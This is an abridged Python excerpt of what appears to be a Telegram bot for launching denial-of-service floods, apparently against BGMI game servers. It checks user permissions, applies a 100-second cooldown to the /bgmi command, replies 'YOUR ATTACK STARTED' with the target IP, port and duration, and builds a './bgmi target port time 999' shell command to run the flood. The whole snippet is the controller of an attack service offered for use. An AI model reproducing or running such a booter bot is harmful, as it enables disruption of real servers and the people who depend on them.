...
def start_attack_reply(message, target, port, time):
    ...
    response = f"{username}, YOUR ATTACK STARTED 🚀\n\nIP: {target}\nPort: {port}\nTime: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\nMETHOD: MICROSOFT🚀"
    bot.reply_to(message, response)
    ...
    if user_id in allowed_user_ids:
        ...
        if user_id not in admin_id:
            ...
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 100:
                response = "You Are On Cooldown . Please Wait 100s Before Running The /bgmi Command Again."
                bot.reply_to(message, response)
                return
        ...
        if len(command) == 4:  # @PrivateFileTg # Updated to accept target, time, and port
            ...
            if time > 240:
                ...
                full_command = f"./bgmi {target} {port} {time} 999"
